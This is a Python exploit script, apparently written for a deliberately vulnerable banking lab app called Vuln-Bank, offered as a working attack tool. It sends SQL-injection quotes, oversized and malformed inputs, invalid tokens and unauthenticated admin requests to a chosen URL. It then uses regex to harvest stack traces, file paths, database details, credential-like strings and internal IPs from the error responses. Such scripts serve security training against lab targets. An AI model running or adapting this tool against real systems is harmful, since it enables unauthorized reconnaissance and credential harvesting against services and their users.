#!/usr/bin/env python3
"""
Detailed Error Messages Exploit for Vuln-Bank

This script demonstrates how to extract sensitive information from detailed error messages
in the Vuln-Bank application through dynamic testing of various endpoints.

Usage:
    python3 exploit.py [target_url]

Example:
    python3 exploit.py http://localhost:5000
"""

import requests
import json
import sys
import argparse
import re
from urllib.parse import urljoin
from colorama import init, Fore, Style
from tabulate import tabulate

# Initialize colorama for colored output
init()

def test_error_messages(base_url):
    """
    Test for detailed error messages by triggering errors
    
    Args:
        base_url: The base URL of the vulnerable application
        
    Returns:
        dict: Dictionary of endpoints with detailed error messages
    """
    print(f"{Fore.BLUE}[*] Testing for detailed error messages...{Style.RESET_ALL}")
    
    # Define test cases to trigger errors
    test_cases = [
        # SQL Injection errors
        {
            "name": "SQL Injection - Login",
            "endpoint": "/login",
            "method": "POST",
            "data": {"username": "'", "password": "password"},
            "description": "Single quote in username to trigger SQL error"
        },
        {
            "name": "SQL Injection - Account Balance",
            "endpoint": "/check_balance/123'",
            "method": "GET",
            "data": None,
            "description": "Single quote in account number to trigger SQL error"
        },
        {
            "name": "SQL Injection - Transactions",
            "endpoint": "/transactions/123'",
            "method": "GET",
            "data": None,
            "description": "Single quote in account number to trigger SQL error"
        },
        
        # Invalid input errors
        {
            "name": "Invalid Input - Transfer",
            "endpoint": "/api/transfer",
            "method": "POST",
            "data": {"from_account": "123", "to_account": "456", "amount": "abc"},
            "description": "Non-numeric amount to trigger validation error"
        },
        {
            "name": "Invalid Input - Card Limit",
            "endpoint": "/api/virtual-cards/1/update-limit",
            "method": "POST",
            "data": {"card_limit": "abc"},
            "description": "Non-numeric card limit to trigger validation error"
        },
        
        # Resource not found errors
        {
            "name": "Resource Not Found - User",
            "endpoint": "/api/users/99999",
            "method": "GET",
            "data": None,
            "description": "Non-existent user ID to trigger 404 error"
        },
        {
            "name": "Resource Not Found - Card",
            "endpoint": "/api/virtual-cards/99999",
            "method": "GET",
            "data": None,
            "description": "Non-existent card ID to trigger 404 error"
        },
        
        # Authentication errors
        {
            "name": "Authentication Error - Protected Endpoint",
            "endpoint": "/api/admin/users",
            "method": "GET",
            "data": None,
            "description": "Access protected endpoint without authentication"
        },
        {
            "name": "Authentication Error - Invalid Token",
            "endpoint": "/api/profile",
            "method": "GET",
            "headers": {"Authorization": "Bearer invalid_token"},
            "data": None,
            "description": "Access protected endpoint with invalid token"
        },
        
        # Server errors
        {
            "name": "Server Error - Large Input",
            "endpoint": "/login",
            "method": "POST",
            "data": {"username": "a" * 10000, "password": "b" * 10000},
            "description": "Very large input to trigger server error"
        },
        {
            "name": "Server Error - Invalid JSON",
            "endpoint": "/login",
            "method": "POST",
            "raw_data": "{invalid_json",
            "headers": {"Content-Type": "application/json"},
            "description": "Invalid JSON to trigger parsing error"
        }
    ]
    
    # Define patterns to look for in error messages
    error_patterns = [
        r"traceback",
        r"stack trace",
        r"at\s+[\w\.]+\(.*\.py:\d+\)",
        r"File\s+\".*\.py\",\s+line\s+\d+",
        r"SQLite3Error",
        r"SyntaxError",
        r"TypeError",
        r"ValueError",
        r"Exception",
        r"Error:",
        r"query:",
        r"SQL syntax",
        r"database",
        r"server",
        r"debug",
        r"internal"
    ]
    
    findings = {}
    
    # Table for results
    results = []
    
    for test_case in test_cases:
        name = test_case["name"]
        endpoint = test_case["endpoint"]
        method = test_case["method"]
        data = test_case.get("data")
        raw_data = test_case.get("raw_data")
        headers = test_case.get("headers", {})
        description = test_case["description"]
        
        url = urljoin(base_url, endpoint)
        
        print(f"{Fore.BLUE}[*] Testing {name}: {method} {url}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}[*] Description: {description}{Style.RESET_ALL}")
        
        try:
            if method == "GET":
                response = requests.get(url, headers=headers, timeout=5)
            else:  # POST
                if raw_data:
                    response = requests.post(url, data=raw_data, headers=headers, timeout=5)
                else:
                    response = requests.post(url, json=data, headers=headers, timeout=5)
            
            # Check if response is JSON
            try:
                resp_data = response.json()
                is_json = True
            except:
                resp_data = response.text
                is_json = False
            
            # Look for error patterns in the response
            error_info = []
            sensitive_info = []
            
            if is_json:
                # Convert JSON to string for pattern matching
                resp_str = json.dumps(resp_data)
                
                # Check each pattern
                for pattern in error_patterns:
                    if re.search(pattern, resp_str, re.IGNORECASE):
                        error_info.append(pattern)
                
                # Extract sensitive information
                if isinstance(resp_data, dict):
                    for key, value in resp_data.items():
                        if any(re.search(pattern, key, re.IGNORECASE) for pattern in error_patterns):
                            if isinstance(value, str) and len(value) > 100:
                                # Truncate long values for display
                                display_value = value[:100] + "..."
                            else:
                                display_value = value
                            sensitive_info.append(f"{key}: {display_value}")
            else:
                # For non-JSON responses, check the raw text
                for pattern in error_patterns:
                    if re.search(pattern, resp_data, re.IGNORECASE):
                        error_info.append(pattern)
                
                # Extract snippets of sensitive information
                for pattern in error_patterns:
                    matches = re.finditer(pattern, resp_data, re.IGNORECASE)
                    for match in matches:
                        # Get some context around the match
                        start = max(0, match.start() - 50)
                        end = min(len(resp_data), match.end() + 50)
                        snippet = resp_data[start:end].replace("\n", " ").strip()
                        sensitive_info.append(snippet)
            
            # Record findings
            if error_info:
                status = f"{Fore.GREEN}Vulnerable{Style.RESET_ALL}"
                print(f"{Fore.GREEN}[+] Found detailed error message in response from {endpoint}{Style.RESET_ALL}")
                print(f"{Fore.GREEN}[+] Error patterns found: {', '.join(error_info)}{Style.RESET_ALL}")
                
                if sensitive_info:
                    print(f"{Fore.GREEN}[+] Sensitive information disclosed:{Style.RESET_ALL}")
                    for info in sensitive_info:
                        print(f"{Fore.GREEN}    - {info}{Style.RESET_ALL}")
                
                # Add to findings
                if endpoint not in findings:
                    findings[endpoint] = {}
                findings[endpoint][method] = {
                    "error_patterns": error_info,
                    "sensitive_info": sensitive_info,
                    "description": description,
                    "response": resp_data if is_json else "Non-JSON response with error information"
                }
            else:
                status = f"{Fore.RED}Not Vulnerable{Style.RESET_ALL}"
                print(f"{Fore.RED}[-] No detailed error message found in response from {endpoint}{Style.RESET_ALL}")
            
            # Add to results table
            results.append([
                name,
                f"{method} {endpoint}",
                response.status_code,
                ", ".join(error_info) if error_info else "None",
                status
            ])
            
            print()
            
        except requests.exceptions.RequestException as e:
            print(f"{Fore.RED}[-] Error testing {method} {endpoint}: {str(e)}{Style.RESET_ALL}")
            
            # Add to results table
            results.append([
                name,
                f"{method} {endpoint}",
                "Error",
                str(e),
                f"{Fore.RED}Error{Style.RESET_ALL}"
            ])
            
            print()
    
    # Print results table
    print(f"\n{Fore.YELLOW}=== Detailed Error Messages Test Results ==={Style.RESET_ALL}")
    print(tabulate(results, headers=["Test Case", "Endpoint", "Status Code", "Error Patterns", "Result"]))
    
    return findings

def extract_sensitive_information(findings):
    """
    Extract and categorize sensitive information from findings
    
    Args:
        findings: Dictionary of findings from error message testing
        
    Returns:
        dict: Categorized sensitive information
    """
    print(f"\n{Fore.BLUE}[*] Extracting sensitive information from error messages...{Style.RESET_ALL}")
    
    sensitive_info = {
        "file_paths": set(),
        "database_info": set(),
        "credentials": set(),
        "internal_ips": set(),
        "stack_traces": []
    }
    
    # Regular expressions for different types of sensitive information
    file_path_pattern = r'(?:\/[\w\-\.]+)+'
    database_info_pattern = r'(?:database|db|sql|query).*'
    credential_pattern = r'(?:password|user|username|auth|key|secret|token).*'
    ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
    stack_trace_pattern = r'(?:traceback|stack trace).*'
    
    for endpoint, methods in findings.items():
        for method, data in methods.items():
            sensitive_info_list = data.get("sensitive_info", [])
            response = data.get("response", "")
            
            # Convert response to string if it's not already
            if not isinstance(response, str):
                response = json.dumps(response)
            
            # Extract file paths
            file_paths = re.findall(file_path_pattern, response)
            for path in file_paths:
                if ".py" in path or "/app/" in path or "/var/" in path:
                    sensitive_info["file_paths"].add(path)
            
            # Extract database information
            db_info = re.findall(database_info_pattern, response, re.IGNORECASE)
            for info in db_info:
                if len(info) > 10:  # Filter out very short matches
                    sensitive_info["database_info"].add(info)
            
            # Extract potential credentials
            creds = re.findall(credential_pattern, response, re.IGNORECASE)
            for cred in creds:
                if len(cred) > 10:  # Filter out very short matches
                    sensitive_info["credentials"].add(cred)
            
            # Extract internal IPs
            ips = re.findall(ip_pattern, response)
            for ip in ips:
                if ip.startswith(("10.", "172.", "192.168.")):
                    sensitive_info["internal_ips"].add(ip)
            
            # Extract stack traces
            stack_traces = re.findall(stack_trace_pattern, response, re.IGNORECASE | re.DOTALL)
            for trace in stack_traces:
                if len(trace) > 50:  # Filter out very short matches
                    sensitive_info["stack_traces"].append(trace[:200] + "..." if len(trace) > 200 else trace)
    
    # Print extracted information
    if sensitive_info["file_paths"]:
        print(f"{Fore.GREEN}[+] Extracted file paths:{Style.RESET_ALL}")
        for path in sensitive_info["file_paths"]:
            print(f"{Fore.GREEN}    - {path}{Style.RESET_ALL}")
    
    if sensitive_info["database_info"]:
        print(f"{Fore.GREEN}[+] Extracted database information:{Style.RESET_ALL}")
        for info in sensitive_info["database_info"]:
            print(f"{Fore.GREEN}    - {info}{Style.RESET_ALL}")
    
    if sensitive_info["credentials"]:
        print(f"{Fore.GREEN}[+] Extracted potential credentials:{Style.RESET_ALL}")
        for cred in sensitive_info["credentials"]:
            print(f"{Fore.GREEN}    - {cred}{Style.RESET_ALL}")
    
    if sensitive_info["internal_ips"]:
        print(f"{Fore.GREEN}[+] Extracted internal IPs:{Style.RESET_ALL}")
        for ip in sensitive_info["internal_ips"]:
            print(f"{Fore.GREEN}    - {ip}{Style.RESET_ALL}")
    
    if sensitive_info["stack_traces"]:
        print(f"{Fore.GREEN}[+] Extracted stack traces:{Style.RESET_ALL}")
        for trace in sensitive_info["stack_traces"]:
            print(f"{Fore.GREEN}    - {trace}{Style.RESET_ALL}")
    
    return sensitive_info

def main():
    parser = argparse.ArgumentParser(description="Test for detailed error messages in Vuln-Bank")
    parser.add_argument("url", nargs="?", default="http://localhost:5000", 
                        help="Base URL of the vulnerable application (default: http://localhost:5000)")
    args = parser.parse_args()
    
    print(f"{Fore.YELLOW}=== Vuln-Bank Detailed Error Messages Exploit ==={Style.RESET_ALL}")
    print(f"{Fore.BLUE}[*] Target: {args.url}{Style.RESET_ALL}")
    
    # Test for detailed error messages
    findings = test_error_messages(args.url)
    
    # Extract sensitive information from findings
    if findings:
        sensitive_info = extract_sensitive_information(findings)
        
        # Summarize findings
        print(f"\n{Fore.YELLOW}=== Summary of Findings ==={Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Found detailed error messages in {len(findings)} endpoints{Style.RESET_ALL}")
        
        if sensitive_info["file_paths"]:
            print(f"{Fore.GREEN}[+] Extracted {len(sensitive_info['file_paths'])} file paths{Style.RESET_ALL}")
        
        if sensitive_info["database_info"]:
            print(f"{Fore.GREEN}[+] Extracted {len(sensitive_info['database_info'])} pieces of database information{Style.RESET_ALL}")
        
        if sensitive_info["credentials"]:
            print(f"{Fore.GREEN}[+] Extracted {len(sensitive_info['credentials'])} potential credentials{Style.RESET_ALL}")
        
        if sensitive_info["internal_ips"]:
            print(f"{Fore.GREEN}[+] Extracted {len(sensitive_info['internal_ips'])} internal IPs{Style.RESET_ALL}")
        
        if sensitive_info["stack_traces"]:
            print(f"{Fore.GREEN}[+] Extracted {len(sensitive_info['stack_traces'])} stack traces{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}[-] No detailed error messages found{Style.RESET_ALL}")
    
    print(f"\n{Fore.BLUE}[*] Detailed error messages testing complete.{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
